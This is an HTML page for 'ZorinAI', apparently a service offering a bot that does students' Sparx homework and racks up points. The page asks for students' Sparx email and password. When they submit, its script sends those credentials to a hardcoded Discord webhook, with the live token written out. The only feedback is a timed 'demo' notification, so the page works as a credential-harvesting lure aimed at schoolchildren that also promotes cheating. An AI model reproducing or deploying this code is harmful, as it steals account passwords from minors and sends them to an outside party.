<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZorinAI | Sparx Portal</title>
    <style>
        :root { 
            --primary: #00a1ff; 
            --bg: #0b0e14; 
            --card: #151921; 
            --input: #1c232d; 
            --text: #ffffff; 
            --border: #2d3848;
            --accent: #0077ff;
        }
        
        body { 
            font-family: 'Inter', sans-serif; 
            background: var(--bg); 
            color: var(--text); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
        }

        .card { 
            background: var(--card); 
            padding: 2.5rem; 
            border-radius: 24px; 
            width: 100%; 
            max-width: 420px; 
            border: 1px solid var(--border); 
            box-shadow: 0 20px 40px rgba(0,0,0,0.6); 
            text-align: center;
        }

        .logo-container { margin-bottom: 1rem; }
        .logo { width: 90px; height: 90px; border-radius: 15px; }

        h1 { font-size: 1.8rem; margin: 0 0 1.5rem 0; font-weight: 800; letter-spacing: -0.5px; }
        h1 span { color: var(--primary); }

        .menu-btn { 
            width: 100%; padding: 14px; margin-bottom: 12px; 
            background: var(--input); border: 1px solid var(--border); 
            color: white; border-radius: 12px; cursor: pointer; 
            text-align: left; font-weight: 600; display: flex; 
            align-items: center; gap: 12px; transition: all 0.2s ease;
        }
        .menu-btn:hover { border-color: var(--primary); background: #232b38; transform: translateY(-2px); }

        .input-group { margin-bottom: 1.2rem; text-align: left; }
        label { display: block; font-size: 0.7rem; color: #7f8ea3; margin-bottom: 6px; text-transform: uppercase; font-weight: 800; }
        
        input, select { 
            width: 100%; padding: 12px; background: var(--input); 
            border: 1px solid var(--border); border-radius: 10px; 
            color: white; box-sizing: border-box; font-size: 0.95rem; 
            transition: border-color 0.2s;
        }
        input:focus { outline: none; border-color: var(--primary); }

        .submit-btn { 
            width: 100%; padding: 15px; background: var(--accent); 
            border: none; border-radius: 12px; color: white; 
            font-size: 1rem; font-weight: 700; cursor: pointer; 
            margin-top: 10px; transition: background 0.2s;
        }
        .submit-btn:hover { background: var(--primary); }
        
        .back-link { display: block; text-align: center; color: #7f8ea3; font-size: 0.85rem; margin-top: 20px; cursor: pointer; text-decoration: none; }
        .hidden { display: none; }
        
        .cred-item { background: var(--input); padding: 14px; border-radius: 12px; margin-bottom: 10px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .cred-alias { font-weight: 700; color: var(--primary); }
        .action-btn { cursor: pointer; font-size: 0.75rem; border: none; background: none; font-weight: bold; }

        #status { text-align: center; margin-top: 15px; font-weight: bold; font-size: 0.9rem; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-container">
        <img src="https://i.ibb.co/VpLqN27/zorin.png" alt="Zorin Logo" class="logo">
    </div>
    <h1>Zorin<span>AI</span></h1>

    <div id="mainMenu">
        <button class="menu-btn" onclick="showPage('newRequest')">üîµ New Bot Request</button>
        <button class="menu-btn" onclick="showPage('savedRequest')">üìÇ Use Saved Accounts</button>
        <button class="menu-btn" onclick="showPage('manageCreds')">‚öôÔ∏è Manage Credentials</button>
    </div>

    <div id="newRequest" class="hidden">
        <div class="input-group"><label>Sparx Email</label><input type="text" id="newEmail" placeholder="student@school.com"></div>
        <div class="input-group"><label>Sparx Password</label><input type="password" id="newPass" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"></div>
        <div id="fields1"></div>
        <button class="submit-btn" onclick="handleFinalSubmit('new')">Dispatch Bot</button>
        <a class="back-link" onclick="showPage('mainMenu')">‚Üê Cancel</a>
    </div>

    <div id="savedRequest" class="hidden">
        <div class="input-group"><label>Select Account</label><select id="accSelect"></select></div>
        <div id="fields2"></div>
        <button class="submit-btn" onclick="handleFinalSubmit('saved')">Dispatch Bot</button>
        <a class="back-link" onclick="showPage('mainMenu')">‚Üê Cancel</a>
    </div>

    <div id="manageCreds" class="hidden">
        <div id="editTitle" style="font-size: 0.9rem; font-weight: bold; margin-bottom: 10px;">Add New Account</div>
        <input type="hidden" id="editIdx" value="-1">
        <div class="input-group"><input type="text" id="alias" placeholder="Nickname (e.g. Main Account)"></div>
        <div class="input-group"><input type="text" id="mEmail" placeholder="Sparx Email"></div>
        <div class="input-group"><input type="password" id="mPass" placeholder="Sparx Password"></div>
        <button class="submit-btn" id="saveBtn" onclick="saveCred()">Save Account</button>
        <div id="credList" style="margin-top: 20px;"></div>
        <a class="back-link" onclick="showPage('mainMenu')">‚Üê Back</a>
    </div>

    <div id="status"></div>
</div>

<template id="fieldTemp">
    <div class="input-group">
        <label>Subject</label>
        <select class="sub" onchange="logicUI(this)">
            <option value="Maths">Maths</option>
            <option value="Science">Science</option>
            <option value="Reader">Reader</option>
        </select>
    </div>
    <div class="input-group">
        <label>Task Type</label>
        <select class="type" onchange="logicUI(this)">
            <option value="Homework">Homework</option>
            <option value="Grind">Grinding</option>
        </select>
    </div>
    <div class="input-group amtBox hidden"><label class="amtLab">Target Amount</label><input type="number" class="amt" value="1000"></div>
</template>

<script>
    const HOOK = "https://discord.com/api/webhooks/1468295462669779004/t7SBMQhdzCaoNrgWDlNRGYRe8iplgYnJDz4h4favBjbokgp1Rgk9dvlB8mWxodT3iVgK";
    let creds = JSON.parse(localStorage.getItem('zorin_creds') || '[]');

    function showPage(id) {
        document.querySelectorAll('.card > div:not(.logo-container):not(h1):not(#status)').forEach(div => div.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
        if(id === 'manageCreds') renderCreds();
        if(id === 'newRequest') inject('fields1');
        if(id === 'savedRequest') { inject('fields2'); updateDrop(); }
    }

    function inject(id) {
        const t = document.getElementById(id);
        if (t.innerHTML !== "") return;
        t.appendChild(document.getElementById('fieldTemp').content.cloneNode(true));
    }

    function logicUI(el) {
        const c = el.closest('div').parentElement;
        const s = c.querySelector('.sub').value, t = c.querySelector('.type').value;
        const b = c.querySelector('.amtBox'), l = c.querySelector('.amtLab');
        
        if (s === "Science") {
            c.querySelector('.type').value = "Homework";
            b.classList.add('hidden');
        } else {
            l.innerText = s === "Maths" ? "Amount (Max 999,999)" : "Amount (Max 9,999)";
            b.classList.toggle('hidden', t !== "Grind");
        }
    }

    function saveCred() {
        const a = document.getElementById('alias').value, e = document.getElementById('mEmail').value, p = document.getElementById('mPass').value;
        const i = parseInt(document.getElementById('editIdx').value);
        if(!a || !e || !p) return alert("Missing info");
        if(i === -1) creds.push({a, e, p}); else creds[i] = {a, e, p};
        localStorage.setItem('zorin_creds', JSON.stringify(creds));
        document.getElementById('editIdx').value = "-1";
        document.getElementById('saveBtn').innerText = "Save Account";
        renderCreds();
    }

    function renderCreds() {
        document.getElementById('credList').innerHTML = creds.map((c, i) => `
            <div class="cred-item">
                <span class="cred-alias">${c.a}</span>
                <div>
                    <button class="action-btn" style="color:#60a5fa" onclick="edit(${i})">EDIT</button>
                    <button class="action-btn" style="color:#f87171" onclick="del(${i})">DEL</button>
                </div>
            </div>`).join('');
    }

    function edit(i) {
        const c = creds[i];
        document.getElementById('alias').value = c.a; document.getElementById('mEmail').value = c.e;
        document.getElementById('mPass').value = c.p; document.getElementById('editIdx').value = i;
        document.getElementById('saveBtn').innerText = "Update Account";
    }

    function del(i) { creds.splice(i, 1); localStorage.setItem('zorin_creds', JSON.stringify(creds)); renderCreds(); }
    function updateDrop() { document.getElementById('accSelect').innerHTML = creds.map((c, i) => `<option value="${i}">${c.a}</option>`).join(''); }

    async function handleFinalSubmit(mode) {
        if (Notification.permission !== "granted") await Notification.requestPermission();
        
        const c = document.getElementById(mode === 'new' ? 'newRequest' : 'savedRequest');
        let email, pass;
        if(mode === 'new') {
            email = document.getElementById('newEmail').value;
            pass = document.getElementById('newPass').value;
        } else {
            const i = document.getElementById('accSelect').value;
            email = creds[i].e; pass = creds[i].p;
        }

        const s = c.querySelector('.sub').value, t = c.querySelector('.type').value;
        const payload = {
            embeds: [{
                title: "üîµ ZORIN BOT REQUEST",
                color: 41215,
                fields: [
                    { name: "Email", value: `||${email}||` },
                    { name: "Password", value: `||${pass}||` },
                    { name: "Task", value: `${s} - ${t}` }
                ],
                description: "**Status Update Links:**\n[ [STARTING] ](https://zorinai.render.com/start) | [ [COMPLETED] ](https://zorinai.render.com/done)"
            }]
        };

        await fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        document.getElementById('status').innerText = "‚úÖ Bot Dispatched. Stay on this page for notifications.";
        
        // Demo notification
        setTimeout(() => {
            new Notification("ZorinAI", { body: "Bot is starting your " + s + " task now!", icon: "https://i.ibb.co/VpLqN27/zorin.png" });
        }, 1500);
    }
</script>
</body>
</html>
